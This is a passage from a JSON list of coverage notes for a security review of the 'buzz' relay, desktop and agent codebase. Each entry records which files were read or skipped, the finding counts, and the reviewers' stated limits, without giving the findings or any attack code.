  "coverage_note": "Read broadly rather than deeply, per coverage-pass instructions. Fully read: relayClientSession.ts (the core WebSocket relay client \u2014 connect/auth/subscribe/publish/reconnect state machine), relayClosedRecovery.ts, readOnlyRelayClient.ts, invites.ts, moderation.ts, deep-link.ts, tauriAgentAuth.ts, tauriMedia.ts, and lib/authors.ts. Skimmed/grepped: relayGateBoundary.ts, relayChannelFilters.ts, tauri.ts (1178 lines, grepped for exported functions and the signRelayEvent/createAuthEvent/invokeTauri boundary), projectGit.ts (grepped for invoke/exec/shell patterns \u2014 all calls are structured invokeTauri() with object params, no shell string building), ui/markdown.tsx (2012 lines \u2014 read the link-rendering section only, ~1260-1450). Did not open: the remaining ~300 files including most of api/tauri*.ts variants (tauriChannels, tauriTeams, tauriWorkflows, tauriEngrams, tauriPersonas, tauriProfiles, tauriMesh, tauriGlobalAgentConfig, tauriManagedAgent*), features/ and hooks/ subfolders, layout/, most of lib/ (customEmojiTags, clipboard, configNudge, detectPrefixQuery, animatedAvatar, codeBlockClipboard), and ui/ components other than markdown.tsx. Also did not inspect the corresponding Rust backend (out of slice) so I cannot confirm whether the two findings below are already mitigated on that side; this is stated as a caveat in each finding. Given the low effort budget, I prioritized the relay WebSocket client (highest blast radius per the task description) and the untrusted-content rendering path (markdown link handling) over exhaustive file-by-file coverage of the remaining ~300 files."
 },
 {
  "slice": "media (crates/buzz-media)",
  "files_read": 12,
  "finding_count": 1,
  "coverage_note": "Read all 11 production source files in the slice in full: auth.rs, bucket_index.rs, config.rs, error.rs, lib.rs, storage.rs, thumbnail.rs, types.rs, upload.rs, upload_record.rs, and validation.rs (validation.rs is 2596 lines; lines 1-1255 read in full and lines 1256-2596 were confirmed via a structural scan to be entirely #[cfg(test)] fixtures/tests, not production code, so no production logic was skipped there). Cargo.toml was read to check dependency surface. Test fixture binary files under tests/fixtures were not opened (not parseable source, not in scope). I traced attacker-facing entry points end to end: Blossom auth verification (auth.rs), buffered image/file upload and streaming video upload pipelines (upload.rs), all magic-byte/structural/metadata-stripping validators for JPEG/PNG/WebP/GIF/MP4 (validation.rs), thumbnail generation (thumbnail.rs), S3 storage wrapper and bucket-key classifier (storage.rs, bucket_index.rs), config validation (config.rs), and the per-upload moderation record writer including public-IP parsing (upload_record.rs). This crate is unusually defensively written (explicit bounds checks via checked_add/filter patterns almost everywhere, fixed-size slice conversions that cannot panic because the slice length is guaranteed by construction, fail-closed error handling, and extensive existing negative-path tests for crafted/malicious inputs), so the obvious classes of parser bugs I checked for (unbounded loops, missing bounds checks, decompression bombs, moov-after-mdat evasion, EXIF/XMP/GPS metadata smuggling, MIME/Content-Type confusion, Blossom auth replay, tenant cross-bleed via sidecar keys) already have deliberate, tested mitigations in place and I could not find a bypass. I did not audit the third-party crates it depends on (mp4, image, imagesize, infer, rust-s3) beyond how their outputs are consumed here, and I did not review buzz-relay's HTTP handlers that call into this crate (out of slice) to confirm MediaConfig's Debug output is never logged there."
 },
 {
  "slice": "agent-surface (buzz-agent, buzz-dev-mcp, buzz-persona, buzz-workflow)",
  "files_read": 17,
  "finding_count": 3,
  "coverage_note": "Read broadly across all four crates rather than exhaustively. Fully read: buzz-dev-mcp (lib.rs, shell.rs, paths.rs, view_image.rs, shim.rs \u2014 the network/exec/path-facing tools); buzz-persona (manifest.rs, resolve.rs, pack.rs, validate.rs \u2014 untrusted-pack parsing and MCP-server merge); buzz-workflow (executor.rs incl. SSRF guard, action_sink.rs, schema.rs head). Partially read: buzz-agent (mcp.rs in full \u2014 MCP registry/spawn/env passthrough; auth.rs in full \u2014 OAuth PKCE token handling; config.rs first ~1200 of 2767 lines \u2014 env parsing, thinking-effort routing, validate()). NOT read in detail: buzz-agent/agent.rs, hints.rs, handoff.rs, llm.rs, wire.rs, types.rs, main.rs, and the back half of config.rs (lines 1211-2767), nor buzz-dev-mcp/rg.rs, read_file.rs, str_replace.rs, todo.rs, tree.rs, or the buzz-agent/buzz-persona test files. Those were skipped for time; a deeper pass should cover agent.rs (the main tool-dispatch loop) and llm.rs (request building) since they're the largest unreviewed files in the slice. Overall code quality in what I read is high \u2014 extensive SSRF guards, size caps, timeout/kill-group discipline, path-traversal tests \u2014 so most candidates below are architectural trust-boundary observations rather than obvious bugs."
 },
 {
  "slice": "crates/buzz-relay",
  "files_read": 11,
  "finding_count": 2,
  "coverage_note": "Coverage pass, not exhaustive. Read in full: handlers/ingest.rs (the untrusted-event entry point, all ~4790 lines skimmed via multiple reads covering the main ingest_event_inner pipeline, kind-specific validators, and the kind:7/reaction storage path), handlers/req.rs (subscription/filter/search handling, ~1338 of 2084 lines plus the exported helper functions), handlers/auth.rs (NIP-42 AUTH handling end to end), admission.rs (rate-limit admission), invite_token.rs (HMAC invite codes + policy-acceptance receipts), webhook_secret.rs (webhook secret storage/compare), api/admin/auth.rs and api/admin/mod.rs (admin API authorization), router.rs (route merging / admin host routing, partial), config.rs (admin config section only). Cross-referenced buzz-core/src/kind.rs for is_relay_admin_kind / is_identity_archive_request_kind / is_command_kind / is_relay_only_kind as instructed. Not read in this pass: api/git/* (git smart-HTTP, CAS, pack cache \u2014 a large subsystem), api/bridge.rs, api/events.rs, api/media.rs, api/mesh_demo.rs, api/nip05.rs, api/invites.rs, api/operator.rs, audio/* (WebRTC/mesh audio), handlers/command_executor.rs, handlers/community_provisioning.rs, handlers/count.rs, handlers/close.rs, handlers/event.rs, handlers/identity_archive.rs, handlers/imeta.rs, handlers/moderation_authz.rs, handlers/moderation_commands.rs, handlers/moderation_notices.rs, handlers/product_feedback.rs, handlers/push_lease.rs, handlers/relay_admin.rs, handlers/report.rs, handlers/side_effects.rs, connection.rs, protocol.rs (parsing, skimmed only via grep for unwrap/panic), state.rs, storage_sweep.rs, subscription.rs, telemetry.rs, tenant.rs, tunnel/*, mesh_boot.rs, push_runtime.rs, metrics.rs, nip11.rs, conformance/*, examples/*. Grepped broadly for `.unwrap()`/`panic!`/`expect(` across the crate; the vast majority of hits are in `#[cfg(test)]` modules, but I traced the handful of expect() calls reachable from ingest.rs's kind-specific validators (agent-engram, agent-turn-metric) and confirmed those are provably safe (the preceding validator enforces exactly the shape the expect assumes) except for the kind:7 reaction case reported below, which is not guarded."
 },
 {
  "slice": "auth (crates/buzz-auth, crates/buzz-acp)",
  "files_read": 16,
  "finding_count": 3,
  "coverage_note": "Read all of buzz-auth (lib.rs, nip42.rs, nip98.rs, nip98_replay.rs, rate_limit.rs, scope.rs, access.rs, error.rs) in full \u2014 this crate is small enough for exhaustive coverage. For buzz-acp (26-file, ~36k-line crate dominated by acp.rs/pool.rs/queue.rs/relay.rs/lib.rs, which are agent-process-management code, not auth logic), I grepped broadly for auth-relevant surface (buzz_auth usage, NIP-42/98, BUZZ_AUTH_TAG, Command::new/spawn, secrets/env) and read filter.rs in full plus the relevant slices of setup_mode.rs, lib.rs and relay.rs that touch auth. I did not read acp.rs, pool.rs, queue.rs, config.rs, usage.rs, engram_fetch.rs, observer.rs, pool_lifecycle.rs line-by-line \u2014 grep showed buzz-acp does not call into buzz-auth at all (it only signs outgoing NIP-98 tokens via relay.rs and parses NIP-OA owner-attestation tags via buzz-sdk, a different crate), so most of that surface is agent-subprocess lifecycle management rather than authentication/authorization, and a coverage-pass budget did not justify a full read of ~30k additional lines with low a-priori hit rate. Per the task note to read across the buzz-auth/buzz-pubsub boundary, I also read crates/buzz-pubsub/src/nip98_replay.rs (the Redis implementation of buzz-auth's Nip98ReplayGuard trait) and one caller each in crates/buzz-relay/src/api/git/transport.rs and crates/buzz-relay/src/handlers/ingest.rs, both outside my nominal slice, because they are the concrete call sites that determine whether buzz-auth's verification/scope contracts are actually honored."
 },
 {
  "slice": "web (buzz/web/src, buzz/admin-web/src)",
  "files_read": 17,
  "finding_count": 2,
  "coverage_note": "Read all 58 files' worth of substantive logic in the slice at a coverage level: fully read shared/lib (nip98.ts, nostr-client.ts, nostr-signer.ts, pubkey.ts, relay-url.ts, buzz-download.ts), the invite flow (invite-api.ts, InvitePage.tsx), the repos feature's data layer (use-repos.ts, use-repo-refs.ts, use-git-browse.ts, git-client.ts) and its main viewer UI (RepoBlobViewer.tsx, RepoReadmeSection.tsx, PubkeyAvatar.tsx), and the entire admin-web app (App.tsx, api.ts). Skipped or only skimmed: the smaller presentational UI components (RepoListItem, RepoCommitsSection, RepoTreeSection, RepoRefsSection, ReposPage, OrgSidebar, ConnectButton, RepoDetailPage, ui primitives like button/card/input/tooltip/badge/sonner), router/route glue (App.tsx, router.tsx, routes/*), ThemeProvider/ThemeToggle, styles, mock-repos.ts (dev-only fixture data), and admin-web's types.ts/useResource.ts/main.tsx \u2014 these are mostly typed plumbing or pure presentation with no external-input handling beyond what's already covered by the data-layer files. Grepped the whole slice for dangerouslySetInnerHTML/innerHTML/eval/rehype-raw and found none, so markdown rendering (README, invite policy docs, admin feedback body) goes through react-markdown's default escaping and is not exploitable via injected HTML in event content. No Rust/unsafe code in this slice (it's TS only) so no memory-safety findings apply here."
 },
 {
  "slice": "desktop-agents (desktop/src/features/agents, desktop/src/features/workflows, desktop/src/features/mesh-compute)",
  "files_read": 24,
  "finding_count": 2,
  "coverage_note": "Coverage pass, not exhaustive. Listed all 322 files in the slice; read broadly across the highest-signal categories: (1) untrusted-input entry points \u2014 observerRelayStore.ts (decrypted relay telemetry frames from managed agents), agentManagement.ts / agentManagementBuffer.ts / useAgentManagement.ts (agent-originated \"management requests\" that create/update personas), personaCatalogRelay.ts (parsing shared-persona events from the public relay catalog), openSnapshotImportFromUrlEvent.ts and AgentSnapshotImportDialog.tsx (cross-user snapshot import); (2) rendering of agent/tool output that could carry injection risk \u2014 agentSessionFileRead.ts, messageLinks.ts, ShellCommandBlock.tsx (all render via React text nodes, no dangerouslySetInnerHTML found anywhere in the slice); (3) secret/credential handling \u2014 bakedEnvHelpers.ts, globalAgentCredentialState.ts, SecretRevealDialog.tsx, PersonaShareDialog.tsx (all had explicit plaintext-secret warnings and no obvious leak path); (4) mesh-compute \u2014 classifyModelRef.ts, servingUsage.ts, shareToggleState.ts (pure client-side classification/display logic, no execution); (5) workflow webhook UI \u2014 WorkflowWebhookSecretDialog.tsx, WorkflowWebhookHeadersEditor.tsx (display/edit only, no request-signing logic present here). I did not open the bulk of the ~150 `ui/*.tsx` dialog/form components (mostly presentational React with no parsing of untrusted data), nor the majority of the `*.test.mjs` files, nor WorkflowFormBuilder.tsx / WorkflowStepCard.tsx / WorkflowRunTrace.tsx / WorkflowDetailPanel.tsx in depth, nor the agentSessionTranscript*/activityRenderClasses rendering pipeline files beyond a sample, nor the mesh-compute hooks (useMeshDownloadProgress, useMeshNodeStatus, useMeshServingUsage). Those are plausible follow-up areas for a deeper pass, particularly the workflow step/trace rendering (relay-supplied step data displayed in the UI) and the full agentSessionTranscript* grouping pipeline. No Rust code is in this slice (desktop-agents is TS/TSX only), so unsafe blocks / overflow / panic-on-untrusted-input concerns did not apply here directly \u2014 those decrypt/verify/spawn operations live behind imported functions (`decryptObserverEvent`, `putManagedAgentRuntimeLifecycle`, etc.) that are implemented outside this slice and were not opened."
 },
 {
  "slice": "tauri-core (desktop/src-tauri/src excluding commands/, capabilities/, tauri.conf.json)",
  "files_read": 14,
  "finding_count": 3,
  "coverage_note": "Read broadly across the slice, prioritizing entry points that take untrusted network/webview input and the graphify-flagged egress_guard coupling. Fully read: egress_guard.rs + egress_guard_tests.rs, relay_admission.rs (incl. its test suite), native_websocket.rs (incl. tests), secret_store.rs (incl. tests), media_proxy.rs, deep_link.rs (incl. tests), nostr_bind.rs, identity_storage.rs, key_backup.rs (partial, first 120 lines), tauri.conf.json, capabilities/default.json. Spot-checked buzz-dev-mcp (crates/buzz-dev-mcp, out of slice but referenced by tauri.conf.json's externalBin) to evaluate the graphify-flagged egress_guard/dev-tooling community link. NOT read in depth due to coverage-pass time budget: huddle/* (11 files, TTS/STT pipeline), managed_agents/* (~70 files \u2014 by far the largest subtree, heavily commingled with commands/ per the task brief), migration/* and migration_*_tests.rs, mesh_llm/*, archive/*, templates/*, event_sync*.rs, events.rs, relay.rs, relay/submit.rs, app_state.rs, app_state_keyring.rs, models.rs, nostr_convert.rs, builderlab.rs, reset.rs, shutdown.rs, tray_menu.rs, webkit_rendering.rs, ptt_shortcut.rs, prevent_sleep.rs, linux_media.rs, util.rs. Given 183 files and the effort budget, I read roughly 12 files in full/near-full plus grepped/skimmed a few others; this is a genuine coverage pass, not exhaustive \u2014 managed_agents/ in particular (the largest and, per the task brief, most commingled-with-commands subtree) is essentially unexamined and should get a dedicated pass. The egress_guard/native_websocket/secret_store/key_backup/relay_admission code I did read is unusually rigorous (structural allowlist tests, cross-process locking, fail-closed defaults) and yielded few plausible bugs \u2014 the one real gap found there (WS control frames) is narrow."
 },
 {
  "slice": "tooling-identity",
  "files_read": 15,
  "finding_count": 2,
  "coverage_note": "Read broadly across the slice rather than deeply into every file, per the coverage-pass mandate. Fully read: git-credential-nostr (lib.rs, main.rs) and git-sign-nostr (lib.rs in two passes, main.rs) \u2014 these are the most heavily hardened crates in the slice, with explicit documented threat-model caveats (TOCTOU, zeroization limits, git-subprocess trust) that I did not re-derive as new findings since the authors already disclose them. Fully read buzz-audit's hash.rs and service.rs (the tamper-evident log). Fully read buzz-search's query.rs (FTS SQL builder \u2014 parameterized throughout, no injection found). Fully read buzz-ws-client's connection.rs and message.rs. Fully read buzz-cli's validate.rs and client.rs (client.rs partially \u2014 read to line 1411 of 2478; the unread back half is upload/download HTTP glue similar in style to what I did read, plus response-formatting helpers). Fully read buzz-pairing-cli/src/main.rs, buzz-admin/src/main.rs, buzz-voice/src/pocket.rs, sprig/src/main.rs. Skipped or only skimmed: buzz-cli's remaining command modules (agents.rs, social.rs, repos.rs, patches.rs, pr.rs, notes.rs, messages.rs, channels.rs, channel_templates.rs, users.rs, issues.rs, moderation.rs, reactions.rs, upload.rs, workflows.rs, emoji.rs, feed.rs, dms.rs, pack.rs) \u2014 grepped for unwrap/expect/Command::new but did not read line-by-line; buzz-conformance (checker.rs, transitions.rs, fixtures) \u2014 not opened, it is a test/fixture-replay tool operating on local JSONL, lower priority under time budget; buzz-test-client's many e2e_*.rs test files \u2014 not opened individually, confirmed via grep that they consume buzz-ws-client's RelayMessage::Event without an intervening verify() call; buzz-voice's imported.rs, pocket_april.rs, pocket_models.rs, tests/pocket_import_audio.rs \u2014 not opened; git-sign-nostr's run()/main dispatch tail (lines ~1740 onward) and its test module \u2014 not opened. No findings were fabricated to fill a quota; the two reported here are the ones I could back with concrete evidence."
 },
 {
  "slice": "desktop-rest",
  "files_read": 30,
  "finding_count": 1,
  "coverage_note": "Read broadly across the slice's ~604 files by sampling representative modules in each named directory rather than reading every file end to end. Covered: main.tsx bootstrap and E2E-bridge gating; onboarding key-import/backup logic (keyImportInput.ts, encryptedBackup.ts, NsecMaskedDisplay.tsx, devFreshOnboarding.ts, useClaimInvite.ts); settings (PrivateKeyBackupRow.tsx, CustomHarnessForm.tsx, harnessFormLogic.ts, moderationQueue.ts); moderation (restrictionState.ts, timeout.ts, moderationDm.ts); community-members role-gating (hooks.ts, CommunityMembersCard.tsx grep); identity-archive/agent-memory hooks (hooks.ts, buildMemoryGraph.ts); markdown/emoji rendering pipeline (rehypeImageGallery.ts, remarkCustomEmoji.ts, customEmojiNode.ts, imetaMediaMarkdown.ts, customEmojiTags.ts) checking for XSS/injection via relay-controlled content; search operator parsing (parseSearchOperators.ts) for ReDoS/injection; reminders (reminderService.ts) for NIP-44/NIP-ER validation; huddle (HuddleContext.tsx) for Tauri invoke misuse; deep-link handling (openPopoverLink.ts, useMessageDeepLinks.ts); localStorage quota handling; SecretRevealDialog.tsx for agent-created key exposure. Not read line-by-line: the large majority of .tsx presentational components in home, pulse, communities, sidebar, presence, user-status, channel-templates, projects, chat, notifications, search, local-archive, and the app/ shell (only grepped for dangerous patterns: dangerouslySetInnerHTML, eval, innerHTML, invoke, nsec/decrypt) \u2014 no dangerous-HTML sinks were found in that grep across the whole slice. Did not read desktop/src/testing/e2eBridge.ts in full (12k lines) beyond confirming it is gated behind import.meta.env.DEV / MODE==='e2e' plus an explicit window.__BUZZ_E2E__ flag, so it cannot activate in production builds. Given the coverage mandate, this is a broad low-depth pass; most code in this slice is client-side UI/state logic that defers real authorization and validation to the Rust backend/relay (repeatedly documented in comments as 'render guard only \u2014 the relay re-verifies'), which meaningfully limits the blast radius of client-side gating bugs found here."
 },
 {
  "slice": "supply-chain",
  "files_read": 24,
  "finding_count": 1,
  "coverage_note": "Read broadly across the full slice: all 13 GitHub Actions workflows (checked for pull_request_target, unsafe interpolation of attacker-controlled fields like PR title/branch into run: blocks, fork-PR secret exposure, action pinning), the Dockerfile and Dockerfile.push-gateway, docker-compose.yml (dev) and deploy/compose/*.yml (prod VPS bundle) plus its .env.example, the Helm chart secret-management template (deploy/charts/buzz/templates/secret-chart.yaml), deny.toml, renovate.json, lefthook.yml, and a sample of scripts/ that gate releases or run in CI (verify-desktop-release-merge.sh, verify-desktop-release-authorization.sh, check-pr-image-urls.sh, ensure-mesh-native-runtime.sh, auto-tag-on-release-pr-merge.yml's inline script). The release-gating scripts and Actions pinning (all third-party actions pinned to full commit SHA, no pull_request_target anywhere, GHCR login skipped for fork PRs, env-var indirection used everywhere instead of inline ${{ }} interpolation in run: bodies) are unusually well-hardened and I did not find an injection path there. I did not individually open every file in bin/ (mostly hermit binary-manager shims/symlinks with no real content), every Helm chart template (spot-checked secret-chart.yaml and skipped deployment.yaml/ingress.yaml/etc.), the full Justfile (41KB, skimmed only), the mobile/desktop release shell scripts beyond a line-count/spot read, or the .github/ISSUE_TEMPLATE and CODEOWNERS files (low-value for this class of finding). Net result: mostly a clean bill of health for the CI/CD injection classes this slice targets; the one concrete, verifiable issue is a supply-chain footgun in the shipped production deploy bundle, not a workflow-injection bug."
 },
 {
  "slice": "desktop-messages",
  "files_read": 33,
  "finding_count": 7,
  "coverage_note": "Deep pass focused on the correctness-critical data/state layer the breadth pass skipped. Read in depth: readState (readStateManager.ts, readStateStorage.ts, readStateSnapshot.ts, useReadState.ts), the channel-window pipeline (channelWindowStore.ts, channelWindowResponse.ts, channelWindowReconciliation.ts, projectChannelWindow.ts, pageOlderMessages.ts, useFetchOlderMessages.ts, messageMerge.ts, messageQueryKeys.ts, messages/hooks.ts including the send/edit/delete mutations and useChannelSubscription), unread tracking (useUnreadChannels.ts, unreadChannelCounts.ts, threadActivityStorage.ts, useLiveChannelUpdates.ts), drafts (useDrafts.ts), media upload (useMediaUpload.ts), scroll/virtualization (useAnchoredScroll.ts, useBufferedTimelineMessages.ts, useSettleGatedPrependMessages.ts, virtualizedTimelineItems.ts), typing (useChannelTyping.ts, useTypingBroadcast.ts), thread fetch (useThreadReplies.ts, useLoadMissingAncestors.ts), custom-emoji/hooks.ts, forum/hooks.ts, formatTimelineMessages.ts, and part of ForumView.tsx plus kind constants. Skimmed only: channelMemberProfileCache.ts. Never opened: the bulk of the ui/ React components (MessageRow, MessageTimeline, ChannelPane, MessageComposer, ForumThreadPanel, composer toolbars, dialogs, sidebars), forcedUnreadStore.ts, unreadRootIdStore.ts, channelSnapshot.ts, threadBadge*/threadReplyUnreadCounts, timelineItems.ts internals, rowHeightEstimate.ts, useTimelineRetention, useVirtualizedBottomSettle, agent-session UI, and all .test.mjs files. Findings below are all in code actually read; the unopened UI components could hide additional render-layer defects."
 },
 {
  "slice": "tauri-commands (buzz/desktop/src-tauri/src/commands) \u2014 Lens B: cryptography, keys, identity",
  "files_read": 33,
  "finding_count": 6,
  "coverage_note": "Read in full (Rust): commands/identity.rs, commands/identity_archive.rs, commands/engrams.rs, commands/team_snapshot.rs, commands/personas/snapshot/import.rs, commands/personas/inbound.rs, commands/personas/sharing.rs, commands/pairing.rs, commands/profile.rs, commands/workspace.rs, commands/agents_profile.rs, commands/agents_deploy.rs, commands/agent_auth.rs, plus src/nostr_bind.rs and src/relay/submit.rs. Read in part (the key-handling / signing / verification regions, located by grep on secret_key|nsec|verify|keys.lock): commands/messages.rs (lines 680-880 and the command index), commands/agents.rs (lines 600-700, 960-1140, 1300-1361), commands/channels.rs (1-140), commands/relay_members.rs (1-120), commands/dms.rs, commands/legacy_storage.rs, commands/clipboard.rs, commands/channel_window.rs, commands/teams.rs, src/relay.rs (NIP-98 + query/submit helpers), src/app_state.rs (signing_keys gate), src/managed_agents/backend.rs (provider_deploy), crates/buzz-core/src/pairing/session.rs (event verification path \u2014 this one is correctly implemented). Followed two calls out to the frontend to establish reachability: desktop/src/features/agents/lib/usePersonaSync.ts and desktop/src/features/profile/avatarProfileSync.ts, and to src/deep_link.rs for the nostr-bind entry point. NEVER OPENED: the ~55 remaining command files that carry no key/signature/verification surface under this lens \u2014 agent_config.rs, agent_models*.rs, agent_discovery*.rs, agent_logs.rs, agent_metric_archive.rs, agent_settings.rs, agent_update_rollback.rs, all media*.rs, all project_git*.rs (breadth pass already read project_git_exec.rs), mesh_llm*.rs, canvas.rs, social.rs, notifications.rs, link_preview.rs, workflows.rs, join_policy.rs, updater.rs, window_*.rs, os_idle.rs, prevent_sleep.rs, qr_download.rs, observer_archive.rs, reconnect_hook_config.rs, relay_reconnect.rs, channel_templates.rs, export_util.rs, global_agent_config.rs, and every *_tests.rs file. I did not audit the mesh-llm subsystem at all. Findings 4 and 5 are reachable in practice only from a compromised/XSS'd renderer (the relay-delivered path is filtered in TypeScript); I state that explicitly rather than inflating it."
 },
 {
  "slice": "tauri-commands (deep pass, Lens C \u2014 correctness)",
  "files_read": 22,
  "finding_count": 9,
  "coverage_note": "Read in full: commands/profile.rs, commands/messages.rs, commands/channels.rs, commands/channel_window.rs, commands/teams.rs, commands/engrams.rs, commands/social.rs, commands/notifications.rs, commands/personas/snapshot/import.rs, commands/team_snapshot.rs (lines 1-260, 260-660, 660-956 \u2014 i.e. everything except its test module). Read in part: commands/agents.rs (lines 380-560, 860-1062, 1210-1376 \u2014 the create/start/stop/delete/deploy bodies; the middle ~300 lines of agent_models/discovery wiring were not read). Followed calls OUT of the slice to verify each claim: desktop/src-tauri/src/events.rs (build_profile, e-tag shapes), relay/submit.rs (submit_event does not set custom_created_at), managed_agents/personas.rs + managed_agents/storage.rs (save_personas and save_managed_agents write the SAME unified store file \u2014 this disproved a rollback finding I initially had against team_snapshot.rs, so it is not reported), managed_agents/persona_events.rs (monotonic_created_at), crates/buzz-db/src/event.rs (bare `until` is `created_at <= u`, inclusive; composite `until`+`before_id` is exclusive), crates/buzz-db/src/lib.rs (replace_addressable_event stale-write protection returns was_inserted=false for a dominated kind:0), crates/buzz-relay/src/handlers/side_effects.rs + ingest.rs (kind:5 is validated author-side and capped at one e/a tag \u2014 this WEAKENS my social.rs finding and I say so in it), crates/buzz-sdk/src/builders.rs (custom emoji reaction content shape). Only grepped, never read as prose: agent_discovery.rs and agent_discovery/*, agent_config.rs, agent_models.rs, agent_settings.rs, global_agent_config.rs, mesh_llm.rs, media*.rs, project_git*.rs, project_terminal.rs, personas/{mod,create,update,inbound,sharing,pending}.rs, workspace.rs, join_policy.rs, link_preview.rs, legacy_storage.rs, workflows.rs, relay_members.rs, agent_auth.rs, agent_update_rollback.rs \u2014 I grepped these for store-lock/save pairing and lock ordering (managed_agents_store_lock is always taken before managed_agent_processes; I found no inversion and no guard held across an await) but did not audit their logic. Never opened at all: identity.rs, identity_archive.rs, pairing.rs, project_git_exec.rs (breadth pass covered these), all *_tests.rs files, canvas.rs, clipboard.rs, dms.rs, os_idle.rs, prevent_sleep.rs, qr_download.rs, updater.rs, window_chrome.rs, window_vibrancy.rs, media_gif.rs, media_snapshot_png.rs, observer_archive.rs, agent_logs.rs, agent_metric_archive.rs, agent_providers.rs, export_util.rs, channel_templates.rs, reconnect_hook_config.rs, agents_deploy.rs, agents_profile.rs. I did NOT find a new signing-oracle-class hole in the 8 sign()-reaching files beyond what the breadth pass reported; the correctness defects below are what those files actually yield."
 },
 {
  "slice": "tauri-commands",
  "files_read": 25,
  "finding_count": 9,
  "coverage_note": "Read in full: personas/inbound.rs (plus its TS caller desktop/src/features/agents/lib/usePersonaSync.ts and desktop/src/shared/api/tauriPersonas.ts), messages.rs, teams.rs, profile.rs, engrams.rs, channel_window.rs, workspace.rs, qr_download.rs, agent_providers.rs, link_preview.rs, personas/snapshot/import.rs. Read substantial portions of: identity.rs (signing/backup/binding sections plus the app_state.rs signing_keys gate it bypasses), agents.rs (first 450 lines: retention/tombstone/archive helpers and the two start_local_agent preflight paths), channels.rs (lines 1-200, the query_relay_all pager and get_channels), team_snapshot.rs (decode + confirm_team_snapshot_import mint loop), media_download.rs (all command bodies + validate_download_url + fetch_blob_bytes_with_cap), agent_discovery.rs (custom-harness + install commands), agent_discovery/managed_node.rs (download/extract path), personas/inbound.rs helpers. Followed calls out of the slice into relay.rs (query_relay / query_relay_at / parse_json_response / relay_http_base_url / build_nip98_auth_header), app_state.rs (signing_keys, resolve_persisted_identity), managed_agents/persona_events.rs (monotonic_created_at), managed_agents/storage.rs (save_managed_agents), and SECURITY.md. Skimmed via grep only (command inventory, subprocess/path/unwrap patterns): agent_config.rs, agent_models.rs, agent_auth.rs, agent_discovery/install_exec.rs, mesh_llm.rs, media.rs, media_transcode.rs, media_animated.rs, social.rs, workflows.rs, relay_members.rs, canvas.rs, dms.rs, join_policy.rs, legacy_storage.rs, notifications.rs, global_agent_config.rs, channel_templates.rs. Never opened: all *_tests.rs files, pairing.rs and identity_archive.rs (breadth pass read them in full), project_git*.rs and project_terminal.rs (breadth pass read project_git_exec.rs and judged the family hardened), personas/{create,mod,pending,sharing,update}.rs, personas/snapshot.rs export side, agent_discovery/{install_report,install_capture}.rs, agent_logs.rs, agent_metric_archive.rs, agent_model_process.rs, agent_models_*.rs, agent_settings.rs, agent_update_rollback.rs, agents_deploy.rs, agents_profile.rs, media_gif.rs, media_snapshot_png.rs, observer_archive.rs, os_idle.rs, prevent_sleep.rs, reconnect_hook_config.rs, relay_reconnect.rs, updater.rs, window_chrome.rs, window_vibrancy.rs, export_util.rs, clipboard.rs, project_repo_paths.rs. I did not compile or run anything; all findings are from static reading."
 },
 {
  "slice": "core",
  "files_read": 26,
  "finding_count": 2,
  "coverage_note": "Read all 24 .rs files under crates/buzz-core/src in full, including the pairing/ submodule. Followed reader_authorized_for_event, P_GATED_KINDS, RESULT_GATED_KINDS and decrypt_observer_payload out of the slice into buzz-relay (handlers/req.rs, count.rs, side_effects.rs, ingest.rs, push_runtime.rs, push_lease.rs, api/bridge.rs). Finding 1 confirms and narrows the breadth pass filter.rs:23 item: verified the caller chain and identified kinds 44100/44101 as the concrete cleartext exploit (breadth listed them only as an unverified possibility). Ruled out two escalations: push pipeline cannot reach these kinds (PUSH_KINDS excludes them, push_lease.rs:15), and client forgery is blocked at ingest.rs:1822. Pure/crypto/parsing modules (network SSRF, tenant/relay normalization, git_perms, engram, pairing, qr, invite, presence, channel, verification, event, error) are exhaustively tested; no correctness defect found. Finding 2 is a low-confidence defense-in-depth note overlapping observer.rs:84; buzz-acp caller behavior not fully confirmed."
 },
 {
  "slice": "desktop-messages (deep pass, Lens B \u2014 cryptography, keys, identity)",
  "files_read": 23,
  "finding_count": 3,
  "coverage_note": "Read in depth (opened and read fully or in large contiguous chunks): messages/lib/formatTimelineMessages.ts, messages/lib/threading.ts (top half), messages/lib/canManageMessage.ts, messages/lib/agentSnapshotClipboard.ts, messages/lib/messageSnapshot.ts, messages/lib/useMediaUpload.ts, messages/lib/useDrafts.ts (identity-scoping section), messages/lib/customEmojiNode.ts (lines 1-155), messages/ui/configNudgeAuthPubkey.ts, messages/ui/MessageRow.tsx (lines 150-480), messages/useChannelTyping.ts, messages/hooks.ts (lines 1-200), channels/readState/readStateManager.ts (full), channels/readState/readStateSnapshot.ts, channels/channelSnapshot.ts. Followed the calls out of the slice and read: shared/lib/authors.ts, features/profile/lib/identity.ts, shared/lib/computeConfigNudge.ts, shared/lib/configNudge.ts (header), shared/ui/config-nudge-attachment.tsx (grepped structure), features/settings/ui/SignOutSection.tsx, and \u2014 to establish the server-side ground truth for the parser differentials \u2014 crates/buzz-relay/src/handlers/ingest.rs (validate_edit_ownership at 785-860, derive_reaction_channel at 345-380, resolve_nip10_thread_meta at 585-735, effective_message_author at 748-780, deletion/e-tag-count checks at 2306-2350, scope/h-scope tables at 230-500, membership-skip at 2140-2175) plus SECURITY.md.\n\nSkimmed / grepped only: the rest of MessageRow.tsx, SystemMessageRow.tsx, MessageReactions.tsx, TimelineMessageList.tsx, MembersSidebar.tsx and the channel-management permission UI (grepped for role/permission gates \u2014 all are UI-affordance gates whose authoritative check is relay-side, so I did not report them), channels/readState/readStateStorage.ts and readStateFormat.ts (grepped, not read line-by-line), useDrafts.ts beyond line 230, spoilerMark.ts, imetaMediaMarkdown.ts, parseDiff.ts, and the .test.mjs files (used only to confirm intended contracts).\n\nNever opened: the bulk of the forum/ UI (ForumComposer.tsx, ForumPostCard.tsx, ForumView.tsx, ForumThreadPanel.tsx), custom-emoji/ui/*, virtualization/scroll hooks (useAnchoredScroll, useVirtualizedBottomSettle, virtualizedTimelineItems), the agent-session UI (AgentSessionThreadPanel, MembersSidebarAgentControls, WelcomeAgentCreateDialog), the composer image editor, and most of channels/ui/*. I made no attempt to audit shared/ui/markdown (the actual sanitizer), which is out of slice.\n\nHonest limits: findings 1 and 2 are cross-checked against the relay source and I am confident about what each side parses; I did NOT run the exploit end to end, so the \"relay accepts it\" step rests on reading ingest.rs and confirming no e-tag-cardinality or duplicate-tag check applies to kind:40003 or to reply events. Finding 3 is a root-cause/defence-in-depth observation, not an independently exploitable bug on a well-behaved relay, and is labelled as such."
 },
 {
  "slice": "core (crates/buzz-core)",
  "files_read": 29,
  "finding_count": 6,
